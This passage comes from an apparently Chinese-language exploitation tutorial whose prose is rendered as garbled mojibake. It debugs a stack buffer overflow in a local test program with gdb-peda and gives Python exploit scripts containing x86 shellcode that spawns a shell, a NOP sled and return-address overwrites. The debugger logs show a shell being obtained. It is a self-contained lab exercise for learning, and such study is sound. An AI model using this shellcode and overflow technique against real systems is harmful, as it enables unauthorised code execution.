<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br>shellcode = (<br><span class="hljs-string">b&#x27;\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2&#x27;</span> +<br><span class="hljs-string">b&#x27;\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89&#x27;</span> +<br><span class="hljs-string">b&#x27;\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&#x27;</span><br>)<br><br>nopsled = <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">64</span><br>padding = <span class="hljs-string">b&#x27;A&#x27;</span> *(<span class="hljs-number">112</span> - <span class="hljs-number">64</span> - <span class="hljs-number">32</span>)<br>eip = <span class="hljs-string">b&#x27;\x30\xd0\xff\xff&#x27;</span><br><br>sys.stdout.buffer.write(nopsled + shellcode +padding +eip)<br></code></pre></td></tr></table></figure>
<h2 id="Testing-Exploit-2-in-gdb"><a href="#Testing-Exploit-2-in-gdb" class="headerlink" title="Testing Exploit 2 in gdb"></a>Testing Exploit 2 in gdb</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 b.py)</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> info registers</span><br>eax            0xffffd00c          0xffffd00c<br>ecx            0xffffd380          0xffffd380<br>edx            0xffffd073          0xffffd073<br>ebx            0x804c000           0x804c000<br>esp            0xffffd000          0xffffd000<br>ebp            0xffffd078          0xffffd078<br>esi            0x2                 0x2<br>edi            0x8049060           0x8049060<br>eip            0x80491ad           0x80491ad &lt;main+55&gt;<br>eflags         0x286               [ PF SF IF ]<br>cs             0x23                0x23<br>ss             0x2b                0x2b<br>ds             0x2b                0x2b<br>es             0x2b                0x2b<br>fs             0x0                 0x0<br>gs             0x63                0x63<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd000:     0x00000000      0x00000001      0xf7ffd9d0      0x90909090<br>0xffffd010:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd020:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd030:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd040:     0x90909090      0x90909090      0x90909090      0xc389c031<br>0xffffd050:     0x80cd17b0      0x6852d231      0x68732f6e      0x622f2f68<br>0xffffd060:     0x52e38969      0x8de18953      0x80cd0b42      0x41414141<br>0xffffd070:     0x41414141      0x41414141      0x41414141      0xffffd030<br>0xffffd080:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd090:     0x00000002      0xffffd134      0xffffd140      0xffffd0c4<br></code></pre></td></tr></table></figure>
<p>ÁªßÁª≠ËøêË°åÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> c</span><br>Continuing.<br>Done!<br><br>Program received signal SIGSEGV, Segmentation fault.<br>[----------------------------------registers-----------------------------------]<br>EAX: 0x6 <br>EBX: 0x41414141 (&#x27;AAAA&#x27;)<br>ECX: 0x41414141 (&#x27;AAAA&#x27;)<br>EDX: 0xffffffff <br>ESI: 0x2 <br>EDI: 0x8049060 (&lt;_start&gt;:       xor    ebp,ebp)<br>EBP: 0x41414141 (&#x27;AAAA&#x27;)<br>ESP: 0x4141413d (&#x27;=AAA&#x27;)<br>EIP: 0x80491c9 (&lt;main+83&gt;:      ret)<br>EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x80491c4 &lt;main+78&gt;: pop    ebx<br>   0x80491c5 &lt;main+79&gt;: pop    ebp<br>   0x80491c6 &lt;main+80&gt;: lea    esp,[ecx-0x4]<br>=&gt; 0x80491c9 &lt;main+83&gt;: ret    <br>   0x80491ca:   xchg   ax,ax<br>   0x80491cc:   xchg   ax,ax<br>   0x80491ce:   xchg   ax,ax<br>   0x80491d0 &lt;__libc_csu_init&gt;: push   ebp<br>[------------------------------------stack-------------------------------------]<br>Invalid $SP address: 0x4141413d<br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>Stopped reason: SIGSEGV<br>0x080491c9 in main (argc=&lt;error reading variable: Cannot access memory at address 0x41414141&gt;, <br>    argv=&lt;error reading variable: Cannot access memory at address 0x41414145&gt;) at bol.c:7<br>7       &#125;<br></code></pre></td></tr></table></figure>
<p>ÂÆÉÂ∞ÜÂÅúÊ≠¢ÁöÑÂéüÂõ†ÊòæÁ§∫‰∏∫ SIGSEGV„ÄÇËøôÊÑèÂë≥ÁùÄÂèëÁîü‰∫ÜÂàÜÊÆµËøùËßÑ‰ø°Âè∑ÔºåÁ®ãÂ∫èÂ∑≤ÂÅúÊ≠¢„ÄÇSIGSEGVÈÄöÂ∏∏Áß∞‰∏∫ÂàÜÊÆµÊïÖÈöú„ÄÇ</p>
<p>Â∫îËØ•Ë∞ÉÁî®‰∏Ä‰∏™ ‚Äú/bin/dash‚Äù Ôºå‰ΩÜÊòØÂπ∂Ê≤°ÊúâÔºåÈáçÊñ∞Ë∞ÉËØïÂπ∂‰∏ÄÊ≠•‰∏ÄÊ≠•Êü•ÁúãÊ±áÁºñ‰ª£Á†ÅÂíåËøêË°åÊÉÖÂÜµ„ÄÇ</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 b.py)</span><br>Starting program: /home/kali/StackOverflowtest/bol $(python3 b.py)<br>[----------------------------------registers-----------------------------------]<br>EAX: 0xffffd00c --&gt; 0x90909090 <br>EBX: 0x804c000 --&gt; 0x804bf14 --&gt; 0x1 <br>ECX: 0xffffd380 (&quot;AAAAAAAAA0\320\377\377&quot;)<br>EDX: 0xffffd073 (&quot;AAAAAAAAA0\320\377\377&quot;)<br>ESI: 0x2 <br>EDI: 0x8049060 (&lt;_start&gt;:       xor    ebp,ebp)<br>EBP: 0xffffd078 (&quot;AAAA0\320\377\377&quot;)<br>ESP: 0xffffd000 --&gt; 0x0 <br>EIP: 0x80491ad (&lt;main+55&gt;:      sub    esp,0xc)<br>EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x80491a4 &lt;main+46&gt;: push   eax<br>   0x80491a5 &lt;main+47&gt;: call   0x8049030 &lt;strcpy@plt&gt;<br>   0x80491aa &lt;main+52&gt;: add    esp,0x10<br>=&gt; 0x80491ad &lt;main+55&gt;: sub    esp,0xc<br>   0x80491b0 &lt;main+58&gt;: lea    eax,[ebx-0x1ff8]<br>   0x80491b6 &lt;main+64&gt;: push   eax<br>   0x80491b7 &lt;main+65&gt;: call   0x8049040 &lt;puts@plt&gt;<br>   0x80491bc &lt;main+70&gt;: add    esp,0x10<br>[------------------------------------stack-------------------------------------]<br>0000| 0xffffd000 --&gt; 0x0 <br>0004| 0xffffd004 --&gt; 0x1 <br>0008| 0xffffd008 --&gt; 0xf7ffd9d0 --&gt; 0x0 <br>0012| 0xffffd00c --&gt; 0x90909090 <br>0016| 0xffffd010 --&gt; 0x90909090 <br>0020| 0xffffd014 --&gt; 0x90909090 <br>0024| 0xffffd018 --&gt; 0x90909090 <br>0028| 0xffffd01c --&gt; 0x90909090 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br><br>Breakpoint 1, main (argc=&lt;error reading variable: Cannot access memory at address 0x41414141&gt;, <br>    argv=&lt;error reading variable: Cannot access memory at address 0x41414145&gt;) at bol.c:6<br>6           printf(&quot;Done!\n&quot;);<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> n</span><br>Done!<br>[----------------------------------registers-----------------------------------]<br>EAX: 0x6 <br>EBX: 0x804c000 --&gt; 0x804bf14 --&gt; 0x1 <br>ECX: 0xffffffff <br>EDX: 0xffffffff <br>ESI: 0x2 <br>EDI: 0x8049060 (&lt;_start&gt;:       xor    ebp,ebp)<br>EBP: 0xffffd078 (&quot;AAAA0\320\377\377&quot;)<br>ESP: 0xffffd000 --&gt; 0x0 <br>EIP: 0x80491bf (&lt;main+73&gt;:      nop)<br>EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x80491b6 &lt;main+64&gt;: push   eax<br>   0x80491b7 &lt;main+65&gt;: call   0x8049040 &lt;puts@plt&gt;<br>   0x80491bc &lt;main+70&gt;: add    esp,0x10<br>=&gt; 0x80491bf &lt;main+73&gt;: nop<br>   0x80491c0 &lt;main+74&gt;: lea    esp,[ebp-0x8]<br>   0x80491c3 &lt;main+77&gt;: pop    ecx<br>   0x80491c4 &lt;main+78&gt;: pop    ebx<br>   0x80491c5 &lt;main+79&gt;: pop    ebp<br>[------------------------------------stack-------------------------------------]<br>0000| 0xffffd000 --&gt; 0x0 <br>0004| 0xffffd004 --&gt; 0x1 <br>0008| 0xffffd008 --&gt; 0xf7ffd9d0 --&gt; 0x0 <br>0012| 0xffffd00c --&gt; 0x90909090 <br>0016| 0xffffd010 --&gt; 0x90909090 <br>0020| 0xffffd014 --&gt; 0x90909090 <br>0024| 0xffffd018 --&gt; 0x90909090 <br>0028| 0xffffd01c --&gt; 0x90909090 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>7       &#125;<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> n</span><br><br>Program received signal SIGSEGV, Segmentation fault.<br>[----------------------------------registers-----------------------------------]<br>EAX: 0x6 <br>EBX: 0x41414141 (&#x27;AAAA&#x27;)<br>ECX: 0x41414141 (&#x27;AAAA&#x27;)<br>EDX: 0xffffffff <br>ESI: 0x2 <br>EDI: 0x8049060 (&lt;_start&gt;:       xor    ebp,ebp)<br>EBP: 0x41414141 (&#x27;AAAA&#x27;)<br>ESP: 0x4141413d (&#x27;=AAA&#x27;)<br>EIP: 0x80491c9 (&lt;main+83&gt;:      ret)<br>EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x80491c4 &lt;main+78&gt;: pop    ebx<br>   0x80491c5 &lt;main+79&gt;: pop    ebp<br>   0x80491c6 &lt;main+80&gt;: lea    esp,[ecx-0x4]<br>=&gt; 0x80491c9 &lt;main+83&gt;: ret    <br>   0x80491ca:   xchg   ax,ax<br>   0x80491cc:   xchg   ax,ax<br>   0x80491ce:   xchg   ax,ax<br>   0x80491d0 &lt;__libc_csu_init&gt;: push   ebp<br>[------------------------------------stack-------------------------------------]<br>Invalid $SP address: 0x4141413d<br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>Stopped reason: SIGSEGV<br>0x080491c9 in main (argc=&lt;error reading variable: Cannot access memory at address 0x41414141&gt;, <br>    argv=&lt;error reading variable: Cannot access memory at address 0x41414145&gt;) at bol.c:7<br>7       &#125;<br></code></pre></td></tr></table></figure>
<p>ÂèçÊ±áÁºñÔºö</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rznice/article/details/82052815/">GDB disassemble_rzniceÁöÑÂçöÂÆ¢-CSDNÂçöÂÆ¢_gdb‰∏≠disassemble</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> disassemble <span class="hljs-variable">$pc</span></span><br>Dump of assembler code for function main:<br>   0x08049176 &lt;+0&gt;:     lea    ecx,[esp+0x4]<br>   0x0804917a &lt;+4&gt;:     and    esp,0xfffffff0<br>   0x0804917d &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]<br>   0x08049180 &lt;+10&gt;:    push   ebp<br>   0x08049181 &lt;+11&gt;:    mov    ebp,esp<br>   0x08049183 &lt;+13&gt;:    push   ebx<br>   0x08049184 &lt;+14&gt;:    push   ecx<br>   0x08049185 &lt;+15&gt;:    sub    esp,0x70<br>   0x08049188 &lt;+18&gt;:    call   0x80490b0 &lt;__x86.get_pc_thunk.bx&gt;<br>   0x0804918d &lt;+23&gt;:    add    ebx,0x2e73<br>   0x08049193 &lt;+29&gt;:    mov    eax,ecx<br>   0x08049195 &lt;+31&gt;:    mov    eax,DWORD PTR [eax+0x4]<br>   0x08049198 &lt;+34&gt;:    add    eax,0x4<br>   0x0804919b &lt;+37&gt;:    mov    eax,DWORD PTR [eax]<br>   0x0804919d &lt;+39&gt;:    sub    esp,0x8<br>   0x080491a0 &lt;+42&gt;:    push   eax<br>   0x080491a1 &lt;+43&gt;:    lea    eax,[ebp-0x6c]<br>   0x080491a4 &lt;+46&gt;:    push   eax<br>   0x080491a5 &lt;+47&gt;:    call   0x8049030 &lt;strcpy@plt&gt;<br>   0x080491aa &lt;+52&gt;:    add    esp,0x10<br>   0x080491ad &lt;+55&gt;:    sub    esp,0xc<br>   0x080491b0 &lt;+58&gt;:    lea    eax,[ebx-0x1ff8]<br>   0x080491b6 &lt;+64&gt;:    push   eax<br>   0x080491b7 &lt;+65&gt;:    call   0x8049040 &lt;puts@plt&gt;<br>   0x080491bc &lt;+70&gt;:    add    esp,0x10<br>   0x080491bf &lt;+73&gt;:    nop<br>   0x080491c0 &lt;+74&gt;:    lea    esp,[ebp-0x8]<br>   0x080491c3 &lt;+77&gt;:    pop    ecx<br>   0x080491c4 &lt;+78&gt;:    pop    ebx<br>   0x080491c5 &lt;+79&gt;:    pop    ebp<br>   0x080491c6 &lt;+80&gt;:    lea    esp,[ecx-0x4]<br>=&gt; 0x080491c9 &lt;+83&gt;:    ret    <br>End of assembler dump.<br></code></pre></td></tr></table></figure>
<p>ÈÄöËøáÊü•ÁúãÊ±áÁºñ‰ª£Á†ÅÔºåÂèëÁé∞Á®ãÂ∫èÂú®ËøêË°åÂÆåputsÂêé‰∏çÊòØleave;retÔºåËÄåÊòØÂèàËøêË°å‰∫Ü‰∫îÂè•‰ª£Á†ÅÔºå‰πüÂ∞±ÊòØËøô‰∫õ‰ª£Á†Å‰ΩøÊåáÈíàespÂèëÁîüÂèòÂåñÔºåËøîÂõûÂú∞ÂùÄ‰πüÁõ∏Â∫îÂú∞ÂèëÁîü‰∫ÜÂèòÂåñ„ÄÇ</p>
<p>ÂàÜÊûêÂæóÁü•Ôºå[ebp-8]-4ÊâçÊòØËøîÂõûÂú∞ÂùÄÔºåÈáçÊñ∞ÊûÑÈÄ†Êï∞ÊçÆÔºö</p>
<p><strong>c.pyÔºö</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/usr/bin/python3</span><br>import sys<br><br>shellcode = (<br>b&#x27;\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2&#x27; +<br>b&#x27;\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89&#x27; +<br>b&#x27;\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&#x27;<br>)<br><br>nopsled = b&#x27;\x90&#x27; * 64<br>padding = b&#x27;A&#x27; *(112 - 64 - 32-12)<br>eip = b&#x27;\x80\xd0\xff\xff\x80\xd0\xff\xff\x80\xd0\xff\xff\x30\xd0\xff\xff&#x27;<br><br>sys.stdout.buffer.write(nopsled + shellcode +padding +eip)<br></code></pre></td></tr></table></figure>
<h2 id="Testing-Exploit-3-in-gdb"><a href="#Testing-Exploit-3-in-gdb" class="headerlink" title="Testing Exploit 3 in gdb"></a>Testing Exploit 3 in gdb</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 c.py)</span><br>Starting program: /home/kali/StackOverflowtest/bol $(python3 c.py)<br>[----------------------------------registers-----------------------------------]<br>EAX: 0xffffd00c --&gt; 0x90909090 <br>EBX: 0x804c000 --&gt; 0x804bf14 --&gt; 0x1 <br>ECX: 0xffffd380 --&gt; 0xffd080ff <br>EDX: 0xffffd073 --&gt; 0xffd080ff <br>ESI: 0x2 <br>EDI: 0x8049060 (&lt;_start&gt;:       xor    ebp,ebp)<br>EBP: 0xffffd078 --&gt; 0xffffd080 --&gt; 0x0 <br>ESP: 0xffffd000 --&gt; 0x0 <br>EIP: 0x80491ad (&lt;main+55&gt;:      sub    esp,0xc)<br>EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x80491a4 &lt;main+46&gt;: push   eax<br>   0x80491a5 &lt;main+47&gt;: call   0x8049030 &lt;strcpy@plt&gt;<br>   0x80491aa &lt;main+52&gt;: add    esp,0x10<br>=&gt; 0x80491ad &lt;main+55&gt;: sub    esp,0xc<br>   0x80491b0 &lt;main+58&gt;: lea    eax,[ebx-0x1ff8]<br>   0x80491b6 &lt;main+64&gt;: push   eax<br>   0x80491b7 &lt;main+65&gt;: call   0x8049040 &lt;puts@plt&gt;<br>   0x80491bc &lt;main+70&gt;: add    esp,0x10<br>[------------------------------------stack-------------------------------------]<br>0000| 0xffffd000 --&gt; 0x0 <br>0004| 0xffffd004 --&gt; 0x1 <br>0008| 0xffffd008 --&gt; 0xf7ffd9d0 --&gt; 0x0 <br>0012| 0xffffd00c --&gt; 0x90909090 <br>0016| 0xffffd010 --&gt; 0x90909090 <br>0020| 0xffffd014 --&gt; 0x90909090 <br>0024| 0xffffd018 --&gt; 0x90909090 <br>0028| 0xffffd01c --&gt; 0x90909090 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br><br>Breakpoint 1, main (argc=0x0, argv=0x8049060 &lt;_start&gt;) at bol.c:6<br>6           printf(&quot;Done!\n&quot;);<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd000:     0x00000000      0x00000001      0xf7ffd9d0      0x90909090<br>0xffffd010:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd020:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd030:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd040:     0x90909090      0x90909090      0x90909090      0xc389c031<br>0xffffd050:     0x80cd17b0      0x6852d231      0x68732f6e      0x622f2f68<br>0xffffd060:     0x52e38969      0x8de18953      0x80cd0b42      0x41414141<br>0xffffd070:     0xffffd080      0xffffd080      0xffffd080      0xffffd030<br>0xffffd080:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd090:     0x00000002      0xffffd134      0xffffd140      0xffffd0c4<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> c</span><br>Continuing.<br>Done!<br>process 8946 is executing new program: /usr/bin/dash<br>Error in re-setting breakpoint 1: No source file named /home/kali/StackOverflowtest/bol.c.<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>[Attaching after process 8946 vfork to child process 8951]<br>[New inferior 2 (process 8951)]<br>[Detaching vfork parent process 8946 after child exec]<br>[Inferior 1 (process 8946) detached]<br>process 8951 is executing new program: /usr/bin/id<br>[Thread debugging using libthread_db enabled]<br>Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.<br>uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),117(bluetooth),120(wireshark),134(scanner),142(kaboxer)<br><span class="hljs-meta">$</span><span class="bash"> [Inferior 2 (process 8951) exited normally]</span><br>Warning: not running<br>zsh: suspended (tty output)  gdb -q bol<br>                                                                                                                 <br>‚îå‚îÄ‚îÄ(kali„âøkali)-[~/StackOverflowtest]<br>‚îî‚îÄ$<br></code></pre></td></tr></table></figure>
<p>ÊàêÂäüÂæóÂà∞‰∏Ä‰∏™ shellÔºå‰∏îÂæóÂà∞‰∫Ü idÔºå‰ΩÜÈÄÄÂá∫‰∫ÜÔºåÂ∫îËØ•ÊòØ peda ÁöÑÈóÆÈ¢òÔºàÂõ†‰∏∫Áî®Ëøá‰∏ÄÊ¨°Ê≤°Êúâ peda ÁöÑ gdbÔºåËÆ∞ÂæóÊòØÊ≤°ÊúâÈÄÄÂá∫Ôºâ</p>
<h2 id="Testing-Exploit-3-in-the-Normal-Shell"><a href="#Testing-Exploit-3-in-the-Normal-Shell" class="headerlink" title="Testing Exploit 3 in the Normal Shell"></a>Testing Exploit 3 in the Normal Shell</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./bol $(python3 c.py)</span><br>Done!<br>zsh: segmentation fault  ./bol $(python3 c.py)<br></code></pre></td></tr></table></figure>
<p>ÁúãÊù•ÈÄâÊã©ÁöÑ Nop ‰ΩçÁΩÆ‰∏çË°åÔºåÂèØ‰ª•Â∞ùËØïÊç¢‰ΩçÁΩÆÁõ¥Âà∞ÂèØ‰ª•Âà©Áî®„ÄÇËøôÈáåÊàëÈÄâÊã©Âà†Èô§ gdb ÁéØÂ¢ÉÂèòÈáèËøõË°åÂ∞ùËØï„ÄÇ</p>
<blockquote>
<p>‰∫ãÂÆûËØÅÊòéÔºågdb ÁéØÂ¢ÉÂíåÂ∫îÁî®Á®ãÂ∫èËøêË°åÁöÑÂÆûÈôÖÁéØÂ¢ÉÁï•Êúâ‰∏çÂêå„ÄÇgdb Â∞ÜËÆæÁΩÆ‰∏Ä‰∫õÁß∞‰∏∫ LINES Âíå COLUMNS ÁöÑÁéØÂ¢ÉÂèòÈáèÔºå‰ª•Ê≠£Á°ÆÊòæÁ§∫ÁªàÁ´Ø‰∏äÁöÑËæìÂá∫„ÄÇ ËøôÂØπ‰∫éÊï¥Ê¥ÅÊºÇ‰∫ÆÁöÑËæìÂá∫ÈùûÂ∏∏ÊúâÁî®Ôºå‰ΩÜÂØπ‰∫éÁéØÂ¢ÉÂØπÊõ¥ÊîπËøá‰∫éÊïèÊÑüÁöÑÊºèÊ¥ûÂà©Áî®ÂºÄÂèëÂàô‰∏çÂà©„ÄÇ</p>
</blockquote>
<p>Âà†Èô§LINESÂíåCOLUMNSÂèòÈáèÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> show environment</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> <span class="hljs-built_in">unset</span> environment LINES</span> <br><span class="hljs-meta">gdb-peda$</span><span class="bash"> <span class="hljs-built_in">unset</span> environment COLUMNS</span><br></code></pre></td></tr></table></figure>
<p>Êàë‰ª¨ÂèØ‰ª•ÈÄöËøá‰ΩøÁî® show environment ÂëΩ‰ª§Ê£ÄÊü•ÂèòÈáèÊòØÂê¶Êú™ËÆæÁΩÆ„ÄÇ</p>
<p>ÈáçÊñ∞ËøêË°åË∞ÉËØïÔºö</p>
